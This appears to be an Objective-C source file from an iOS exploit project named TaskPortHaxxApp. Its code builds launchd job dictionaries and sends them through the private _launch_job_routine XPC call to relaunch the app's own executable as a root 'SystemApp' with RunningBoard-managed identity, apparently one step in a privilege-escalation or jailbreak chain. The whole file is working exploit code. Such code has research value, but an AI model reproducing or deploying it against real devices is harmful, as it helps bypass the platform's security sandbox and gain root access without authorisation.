//
//  launch.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 31/10/25.
//

@import Foundation;
#import "taskporthaxx.h"
#import "ViewController.h"

BOOL launchTest(NSString *arg1) {
    NSString *bundleID = NSBundle.mainBundle.bundleIdentifier;
    NSString *execPath = NSBundle.mainBundle.executablePath;
    NSDictionary *plist = @{
        @"ProcessType": @"SystemApp",
        @"EnableTransactions": @NO,
        @"_ManagedBy": @"com.apple.runningboard",
        @"CFBundleIdentifier": bundleID,
        @"ThrottleInterval": @(2147483647),
        @"PersonaEnterprise": @(1000),
        @"EnablePressuredExit": @NO,
        @"InitialTaskRole": @(1),
        @"UserName": @"root",
        @"ExitTimeOut": @(1),
        @"Label": [NSString stringWithFormat:@"UIKitApplication:%@[%d]",
                   bundleID, arc4random_uniform(10000)],
        @"MaterializeDatalessFiles": @YES,
        //@"Program": execPath,
        @"ProgramArguments": arg1 ? @[ execPath, arg1 ] : @[ execPath ],
        @"MachServices": @{},
        @"EnvironmentVariables": @{
            @"TMPDIR": @"/var/tmp",
            @"HOME": @"/var/root",
            @"CFFIXED_USER_HOME": @"/var/root"
        },
        @"_AdditionalProperties": arg1 ? @{} : @{
            @"RunningBoard": @{
                @"Managed": @YES,
                @"RunningBoardLaunched": @YES,
                @"RunningBoardLaunchedIdentity": @{
                    @"TYPE": @(3),
                    @"EAI": bundleID
                }
            }
        }
    };
    NSDictionary *root = @{
        @"monitor": @NO,
        @"handle": @(0),
        @"type": @(7),
        @"plist": plist
    };
    
    // Convert to xpc_object_t
    xpc_object_t xpcDict = _CFXPCCreateXPCObjectFromCFObject(root);
    // For some reason _CFXPCCreateXPCObjectFromCFObject doesn't produce correct uint64, so we set them again here
    xpc_dictionary_set_uint64(xpcDict, "handle", 0);
    xpc_dictionary_set_uint64(xpcDict, "type", 7);
    
    xpc_object_t result;
    kern_return_t kr = _launch_job_routine(0x3e8, xpcDict, &result);
    printf("Launch job routine returned: %s\n", mach_error_string(kr));
    
    return kr == KERN_SUCCESS;
}

pid_t launchTestWithThread(NSString *arg1, int thread_id) {

    NSString *bundleID = [NSString stringWithFormat:@"%@.%d", NSBundle.mainBundle.bundleIdentifier, thread_id];
    NSString *execPath = NSBundle.mainBundle.executablePath;
    NSDictionary *plist = @{
        @"ProcessType": @"SystemApp",
        @"EnableTransactions": @NO,
        @"_ManagedBy": @"com.apple.runningboard",
        @"CFBundleIdentifier": bundleID,
        @"ThrottleInterval": @(2147483647),
        @"PersonaEnterprise": @(1000),
        @"EnablePressuredExit": @NO,
        @"InitialTaskRole": @(1),
        @"UserName": @"root",
        @"ExitTimeOut": @(1),
        @"Label": [NSString stringWithFormat:@"UIKitApplication:%@[%d]",
                   bundleID, arc4random_uniform(10000)],
        @"MaterializeDatalessFiles": @YES,
        @"ProgramArguments": arg1 ? @[ execPath, arg1 ] : @[ execPath ],
        @"MachServices": @{},
        @"EnvironmentVariables": @{
            @"TMPDIR": @"/var/tmp",
            @"HOME": @"/var/root",
            @"CFFIXED_USER_HOME": @"/var/root",
            @"EXCEPTION_SERVER_ID": [NSString stringWithFormat:@"%d", thread_id]
        },
        @"_AdditionalProperties": arg1 ? @{} : @{
            @"RunningBoard": @{
                @"Managed": @YES,
                @"RunningBoardLaunched": @YES,
                @"RunningBoardLaunchedIdentity": @{
                    @"TYPE": @(3),
                    @"EAI": bundleID
                }
            }
        }
    };
    NSDictionary *root = @{
        @"monitor": @NO,
        @"handle": @(0),
        @"type": @(7),
        @"plist": plist
    };

    xpc_object_t xpcDict = _CFXPCCreateXPCObjectFromCFObject(root);
    xpc_dictionary_set_uint64(xpcDict, "handle", 0);
    xpc_dictionary_set_uint64(xpcDict, "type", 7);

    xpc_object_t result;
    kern_return_t kr = _launch_job_routine(0x3e8, xpcDict, &result);
    printf("job thread %d ret %s\n", thread_id, mach_error_string(kr));

    if (kr != KERN_SUCCESS) {
        return -1;
    }

    pid_t launched_pid = -1;
    if (result && xpc_get_type(result) == XPC_TYPE_DICTIONARY) {
        launched_pid = xpc_dictionary_get_int64(result, "pid");
        printf("thread %d with pid %d\n", thread_id, launched_pid);
    }

    return launched_pid;
}

